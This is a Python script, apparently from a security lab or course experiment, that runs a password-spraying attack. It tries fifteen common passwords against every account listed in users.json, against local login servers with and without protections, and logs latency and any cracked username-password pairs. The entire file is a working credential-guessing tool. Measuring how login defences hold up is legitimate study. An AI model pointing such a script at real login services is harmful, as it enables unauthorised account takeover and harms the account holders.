import requests
import time
import json
import os

# ======================================
# GENERAL SETTINGS
# ======================================
GROUP_SEED = 6631928
PASSWORD_LIST = [
    "123456",
    "password",
    "qwerty",
    "111111",
    "abc123",
    "123123",
    "letmein",
    "admin",
    "iloveyou",
    "welcome",
    "Passw0rd",
    "qazwsx",
    "dragon",
    "football",
    "monkey",
]
MAX_TIME = 7200

os.makedirs("logs", exist_ok=True)


# ======================================
# LOAD USERS
# ======================================
with open("users.json", "r") as f:
    USERS = json.load(f)


# ======================================
# SEND ATTEMPT
# ======================================
def send_attempt(url, username, password):
    t0 = time.time()
    try:
        r = requests.post(url, json={
            "username": username,
            "password": password
        })
        latency = (time.time() - t0) * 1000
        data = r.json()
        return data.get("status"), latency
    except:
        return "error", (time.time() - t0) * 1000


# ======================================
# WRITE LOG ENTRY
# ======================================
def write_entry(logfile, entry):
    with open(logfile, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry) + "\n")


# ======================================
# SPRAYING ATTACK
# ======================================
def spraying_attack(url, protections_flag, logfile):

    # Reset server state
    reset_url = url.replace("/login", "/reset")
    try:
        requests.post(reset_url)
    except:
        pass

    start_time = time.time()

    # HEADER
    with open(logfile, "w", encoding="utf-8") as f:
        f.write("===========================================\n")
        f.write("        PASSWORD SPRAYING ATTACK\n")
        f.write("===========================================\n")
        f.write(f"Start Time: {time.ctime(start_time)}\n")
        f.write(f"Protections: {protections_flag}\n")
        f.write(f"Max Time: {MAX_TIME} seconds\n")
        f.write(f"Passwords Tested: {len(PASSWORD_LIST)}\n")
        f.write(f"Users Count: {len(USERS)}\n")
        f.write("===========================================\n\n")

    print(f"\n>>> START spraying attack (protections={protections_flag})")
    print(f"-> Log: {logfile}")

    # MAIN LOOP
    for pwd in PASSWORD_LIST:
        print(f"\n--- Testing password: {pwd} ---")

        for user in USERS:
            username = user["username"]
            category = user["category"]
            hash_mode = user["hash_mode"]

            elapsed = time.time() - start_time
            if elapsed > MAX_TIME:
                print("\nTIME LIMIT REACHED, stopping spraying attack.")
                with open(logfile, "a", encoding="utf-8") as f:
                    f.write("\n=== TIME LIMIT REACHED ===\n")
                return

            status, lat_ms = send_attempt(url, username, pwd)

            entry = {
                "timestamp": time.time(),
                "group_seed": GROUP_SEED,
                "username": username,
                "category": category,
                "password_attempt": pwd,
                "result": status,
                "latency_ms": round(lat_ms, 3),
                "hash_mode": hash_mode,
                "protections": protections_flag
            }

            write_entry(logfile, entry)

            if status == "success":
                print(f"[+] SUCCESS: {username} -> {pwd}")
                with open(logfile, "a", encoding="utf-8") as f:
                    f.write(f"\n=== SUCCESS for {username} ===\nPassword: {pwd}\n\n")


# ======================================
# MAIN
# ======================================
def main():

    CONFIGS = [
        ("OFF", "http://127.0.0.1:6000/login"),
        ("ON",  "http://127.0.0.1:5000/login"),
    ]

    for prot, url in CONFIGS:
        logfile = f"logs/spraying_{'with' if prot=='ON' else 'no'}_protection.log"
        spraying_attack(url, prot, logfile)


main()
